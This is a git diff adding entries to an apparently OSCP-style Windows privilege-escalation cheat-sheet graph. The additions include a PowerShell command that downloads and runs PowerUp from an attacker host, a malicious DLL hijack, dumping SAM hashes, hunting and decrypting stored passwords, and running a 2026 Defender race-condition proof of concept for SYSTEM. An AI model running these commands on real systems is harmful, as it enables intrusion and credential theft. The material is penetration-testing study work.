@@ -32,6 +32,16 @@ reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`,
 wmic qfe get HotFixID,InstalledOn
 hostname & whoami /all`,
                 },
+                {
+                    label: 'Scheduled tasks (run as SYSTEM)',
+                    code: `schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
+# a task running a writable binary/script as SYSTEM = replace it and wait for the trigger`,
+                },
+                {
+                    label: 'Installed software + events',
+                    code: `Get-CimInstance Win32_Product | select Name,Version
+Get-WinEvent -LogName Security -MaxEvents 50 | ? {$_.Id -eq 4624} | select TimeCreated,Message`,
+                },
             ],
             tags: ['winpeas', 'whoami', 'priv', 'enumeration'],
         },
@@ -111,6 +121,21 @@ sc stop <service> & sc start <service>`,
 # if path is C:\\Program Files\\App\\service.exe and C:\\Program is writable:
 # drop C:\\Program.exe, restart the service`,
                 },
+                {
+                    label: 'PowerUp automation',
+                    code: `# find every service misconfig at once:
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<kali-ip>/PowerUp.ps1'); Invoke-AllChecks"
+# exploit a writable service binary:
+Invoke-ServiceAbuse -Name '<service>' -UserName '<domain>\\<user>'`,
+                },
+                {
+                    label: 'DLL hijack',
+                    code: `# find a service loading a missing / writable DLL:
+Get-CimInstance Win32_Service | ? {$_.PathName -match '<path>'}
+# compile a malicious DLL on Kali:
+x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
+# drop it in the DLL search path, restart the service`,
+                },
             ],
             tags: ['service', 'unquoted-path', 'binary-hijack', 'registry'],
         },
@@ -160,6 +185,31 @@ cmdkey /list`,
 cmdkey /list
 reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s
 type C:\\Windows\\Panther\\Unattend.xml`,
+                },
+                {
+                    label: 'PuTTY sessions + windows.old SAM',
+                    code: `reg query "HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions" /s
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword
+# old installs keep the original SAM/SYSTEM:
+dir C:\\Windows.old\\Windows\\System32\\config
+impacket-secretsdump -sam C:\\Windows.old\\Windows\\System32\\config\\SAM -system C:\\Windows.old\\Windows\\System32\\config\\SYSTEM LOCAL`,
+                },
+                {
+                    label: 'KeePass + Select-String hunt',
+                    code: `dir /s /b C:\\*.kdbx C:\\Users\\*\\*.kdbx 2>nul
+Get-ChildItem -Recurse -Include *.xml,*.ini,*.txt,*.config -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|secret' -List`,
+                },
+                {
+                    label: 'McAfee SiteList.xml decrypt',
+                    code: `dir /s /b C:\\*SiteList.xml 2>nul
+# on Kali:
+python3 mcafee-sitelist-pwd-decryption.py SiteList.xml`,
+                },
+                {
+                    label: 'Weak-crypto config decrypt (Argus DVR)',
+                    code: `# DVRParams.ini / .env from an FTP share -> weak-crypto admin password:
+searchsploit "Argus DVR"
+# EDB-50130 decrypts the stored password (patch the script for special chars)`,
                 },
             ],
             tags: ['credentials', 'unattend', 'powershell-history', 'cmdkey'],
@@ -282,6 +332,25 @@ Get-AdmPwdPassword -ComputerName <host>`,
             ],
             tags: ['named-pipe', 'impersonation', 'accesschk', 'service'],
         },
+        {
+            id: 'rogueplanet-defender',
+            title: 'Defender TOCTOU (RoguePlanet)',
+            type: 'technique',
+            phase: 'windows-privesc',
+            os: 'windows',
+            description:
+                'CVE-2026-50656 (RoguePlanet): a time-of-check/time-of-use race in Windows Defender lets a low-priv user swap a quarantined file for a SYSTEM-owned binary and escalate to SYSTEM. Seen in a 2026 exam report.',
+            commands: [
+                {
+                    label: 'Run the PoC',
+                    code: `# CVE-2026-50656 RoguePlanet - Defender TOCTOU -> SYSTEM:
+# transfer the PoC to the target, then:
+RoguePlanet.exe
+whoami   # nt authority\\system`,
+                },
+            ],
+            tags: ['rogueplanet', 'cve-2026-50656', 'defender', 'toctou'],
+        },
     ],
     edges: [
         { from: 'privesc-enum-windows', to: 'seimpersonate-potato', label: 'SeImpersonate present' },
@@ -307,6 +376,9 @@ Get-AdmPwdPassword -ComputerName <host>`,
         { from: 'sebackup-ntsd', to: 'ad-dump-creds', label: 'domain-joined -> dump creds' },
         { from: 'laps', to: 'creds-found', label: 'plaintext local admin password' },
         { from: 'named-pipe-abuse', to: 'system-windows', label: 'impersonate SYSTEM' },
+        { from: 'privesc-enum-windows', to: 'rogueplanet-defender', label: 'Defender present (TOCTOU)' },
+        { from: 'rogueplanet-defender', to: 'system-windows', label: 'race -> SYSTEM' },
+
     ],
 }
 
